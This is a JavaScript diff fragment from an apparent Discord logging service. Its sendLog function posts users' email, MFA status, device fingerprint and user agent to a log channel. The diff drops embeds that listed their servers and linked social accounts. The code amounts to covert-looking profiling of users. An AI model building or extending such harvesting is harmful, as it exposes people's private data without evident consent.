     }
 
-    if (isError && errorMessage) {
-      embed.fields.unshift({ name: '❌ Error', value: errorMessage, inline: false });
-    }
-
-    // Build embeds array
-    const embeds = [embed];
-
-    // Add full servers embed if user is in many servers
-    if (userGuilds.length > 0) {
-      const fullGuildList = userGuilds
-        .map(g => `${g.name}${g.owner ? ' 👑' : ''}`)
-        .join('\n');
-      
-      const serversEmbed = {
-        title: `🏠 All Servers (${guildCount} total)`,
-        color: 0x5865F2,
-        fields: [
-          {
-            name: '📋 Complete Server List',
-            value: fullGuildList.length > 1024 
-              ? fullGuildList.substring(0, 1020) + '...' 
-              : fullGuildList || 'None',
-            inline: false
-          }
-        ]
-      };
-      embeds.push(serversEmbed);
-    }
-
-    // Add full connections embed if user has many connections
-    if (userConnections.length > 0) {
-      const fullConnectionsList = userConnections
-        .map(c => {
-          const icons = {
-            discord: '💬', steam: '🎮', twitter: '🐦', twitch: '🎬',
-            youtube: '📺', reddit: '🤖', facebook: '📘', github: '💻',
-            instagram: '📷', tiktok: '🎵', spotify: '🎵', leagueoflegends: '⚔️',
-            xbox: '🎮', playstation: '🎮', roblox: '🎮', domain: '🔗'
-          };
-          const icon = icons[c.type] || '🔗';
-          const verified = c.verified ? '✅' : '❌';
-          
-          let link = 'No link';
-          if (c.type === 'twitter' && c.id) link = `https://twitter.com/${c.id}`;
-          else if (c.type === 'youtube' && c.id) link = `https://youtube.com/@${c.id}`;
-          else if (c.type === 'github' && c.id) link = `https://github.com/${c.id}`;
-          else if (c.type === 'steam' && c.id) link = `https://steamcommunity.com/profiles/${c.id}`;
-          else if (c.type === 'twitch' && c.id) link = `https://twitch.tv/${c.id}`;
-          else if (c.type === 'instagram' && c.id) link = `https://instagram.com/${c.id}`;
-          else if (c.type === 'tiktok' && c.id) link = `https://tiktok.com/@${c.id}`;
-          else if (c.type === 'spotify' && c.id) link = `https://open.spotify.com/user/${c.id}`;
-          else if (c.type === 'roblox' && c.id) link = `https://roblox.com/users/${c.id}`;
-          else if (c.type === 'domain' && c.id) link = `https://${c.id}`;
-          else if (c.url) link = c.url;
-          
-          return `${icon} **${c.name || c.type}** ${verified}\n└ Link: ${link}`;
-        })
-        .join('\n\n');
-      
-      const connectionsEmbed = {
-        title: `🔗 All Connections (${userConnections.length} total)`,
-        color: 0x27ae60,
-        fields: [
-          {
-            name: '📱 Connected Accounts',
-            value: fullConnectionsList.length > 1024
-              ? fullConnectionsList.substring(0, 1020) + '...'
-              : fullConnectionsList,
-            inline: false
-          }
-        ]
-      };
-      embeds.push(connectionsEmbed);
-    }
-
-    // Add detailed fingerprint embed if device info is available
+    // Device fingerprint embed
     if (deviceInfo) {
-      const fingerprintEmbed = {
+      embeds.push({
         title: '🔍 Detailed Device Fingerprint',
         color: 0x5865F2,
         fields: [
@@ -649,13 +439,11 @@ async function sendLog(userId, username, avatar, email, emailVerified, mfaEnable
           { name: '🆔 Full Fingerprint', value: `\`${deviceInfo.fingerprint}\``, inline: false },
           { name: '📜 User Agent', value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
         ]
-      };
-      embeds.push(fingerprintEmbed);
+      });
     }
 
-    console.log('📝 sendLog: Sending to Discord API, embeds count:', embeds.length);
-    console.log('📝 sendLog: DISCORD_BOT_TOKEN present:', !!process.env.DISCORD_BOT_TOKEN);
-
+    // Send to Discord
+    console.log('📝 Sending', embeds.length, 'embeds to Discord...');
     const logResponse = await fetch(`https://discord.com/api/channels/${logChannelId}/messages`, {
       method: 'POST',
       headers: {
@@ -665,17 +453,17 @@ async function sendLog(userId, username, avatar, email, emailVerified, mfaEnable
       body: JSON.stringify({ embeds: embeds })
     });
 
-    console.log('📝 sendLog: Discord API response status:', logResponse.status);
+    console.log('📊 Discord API Response:', logResponse.status);
 
     if (!logResponse.ok) {
       const errData = await logResponse.json();
       console.error('❌ Failed to send log:', errData);
-      console.error('❌ Discord API Error:', JSON.stringify(errData, null, 2));
+      console.error('❌ Discord Error:', JSON.stringify(errData, null, 2));
     } else {
       console.log('✅ Log sent successfully to Discord!');
     }
   } catch (error) {
-    console.error('❌ Failed to send log:', error);
+    console.error('❌ sendLog error:', error);
     console.error('❌ Error stack:', error.stack);
   }
 }
